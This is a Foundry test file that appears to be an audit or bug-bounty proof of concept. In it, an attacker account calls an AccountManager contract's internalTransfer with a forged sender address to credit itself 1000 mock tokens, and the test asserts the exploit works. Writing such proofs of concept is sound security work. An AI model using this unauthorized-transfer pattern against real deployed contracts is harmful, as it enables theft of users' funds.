// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {AccountManager} from "src/AccountManager.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";

contract PoC is Test {
    AccountManager accountManager;
    MockERC20 token;
    address attacker;

    function setUp() public {
        attacker = vm.addr(1);
        address fakeSender = address(0x0000000000000000000000000000000000000001);

        // Deploy mock token and mint to attacker for setup
        token = new MockERC20("MockToken", "MTK", 18);
        accountManager = new AccountManager();

        // Give some tokens to the attacker
        token.mint(address(accountManager), 1000 ether);

        // Fund attacker's account (not necessary for this, just mimicking)
        accountManager.deposit(attacker, address(token), 0);

        // No balance for fakeSender in this setup (it's empty)
    }

    function test_submissionValidity() public {
        address fakeSender = address(0x0000000000000000000000000000000000000001);

        vm.prank(attacker);
        accountManager.internalTransfer(fakeSender, attacker, address(token), 1000 ether);

        uint256 balance = accountManager.getAccountBalance(attacker, address(token));
        assertEq(balance, 1000 ether, "Exploit failed — balance not updated");
    }
}
